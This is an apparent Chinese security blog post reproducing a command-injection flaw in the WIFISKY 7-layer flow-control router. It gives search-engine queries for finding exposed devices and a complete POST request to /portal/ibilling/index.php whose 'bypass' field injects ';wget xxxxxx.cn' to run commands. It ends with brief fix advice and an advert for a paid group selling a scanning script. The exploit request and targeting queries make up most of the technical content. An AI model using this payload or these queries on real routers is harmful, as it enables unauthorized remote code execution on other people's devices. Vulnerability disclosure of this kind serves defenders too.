#  【漏洞复现】WIFISKY 7层流控路由器index存在命令执行漏洞 | 附poc   
原创 xiaocaiji  网安鲲为帝   2024-06-25 19:15  
  
**0x00****免责声明**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
本  
文  
仅  
用  
于  
技  
术  
讨  
论  
与  
学  
习  
，  
利  
用  
此  
文  
所  
提  
供  
的  
信  
息  
而  
造  
成  
的  
任  
何  
直  
接  
或  
者  
间  
接  
的  
后  
果  
及  
损  
失  
，  
均  
由  
使  
用  
者  
本  
人  
负  
责  
，  
文  
章  
作  
者  
及  
本  
公  
众  
号  
团  
队  
不  
为  
此  
承  
担  
任  
何  
责  
任  
。  
  
  
**0x01 漏洞描述**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
WIFISKY7层流控路由器存在rce, index 接口存在一个命令执行漏洞，使得攻击者可以通过构造特定的请求远程执行恶意代码。此漏洞可能导致攻击者获取系统权限、执行任意命令，严重威胁系统的机密性和完整性。  
  
  
**0x02 空间测绘**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
测  
绘  
语  
法：  
```
Fofa：title="WIFISKY 7层流控路由器"
quake：title:"WIFISKY 7层流控路由器"
hunter：web.title="WIFISKY 7层流控路由器"
```  
  
  
****  
**0x03 漏洞复现**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
登录界面如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uIXF7K92VEIHc5IdGK90XAQibslnh57nWt67ozkoEVqP8h8vXVV9jEKcweKcg1ABM4xWlo0t4BQE1yRjhkSClCg/640?wx_fmt=png&from=appmsg "")  
  
命令执行：  
```
POST /portal/ibilling/index.php HTTP/1.1
Host: 
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36

{"type":5,"version":2,"bypass":";wget xxxxxx.cn"}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uIXF7K92VEIHc5IdGK90XAQibslnh57nWdcO626k5vuGv1YxcZPI9icFhBRibYD5icrltib2QM5WMkmHSI7icTwoskYA/640?wx_fmt=png&from=appmsg "")  
  
  
**0x04 修复意见**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
1、请联系厂商进行修复。   
  
2、在后端过滤用户输入字符。   
  
3、设置白名单访问。  
  
  
**0x05 nuclei验证脚本获取**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
验证脚本已发布到纷传圈子，目前还有几个优惠进入名额，师傅们要进的抓紧哦！后续价格只增不减，错过机会难再遇哦！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/uIXF7K92VELiclpicHoicoYfvibSxRClmxsZuCkLVI6mxpttTQj03nf0QAapfvd228MSTuPoqHVz2eKSwxM5ib18CAw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
**0x06 欢迎进群交流**  
  
!  
  
![](https://mmbiz.qpic.cn/mmbiz_svg/1MLz0YkS76HN2mDzsc3eKehjJJTibD6cvzwcAQjFRKJibj2hFeFx9xqPxeAVNLIWWM7ia8XD9YUsUYyFLonA46ewoicJrmJO2oNx/640?wx_fmt=svg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
添加微信进群：  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/uIXF7K92VEJdfiaGbzW6sp0kFvhYC7ejuJuS6lWyHyUGg40F2QVic6goic34EbYceQ2WE4eyMZ8oxbswQkhzJLhNQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
      
  
  
  
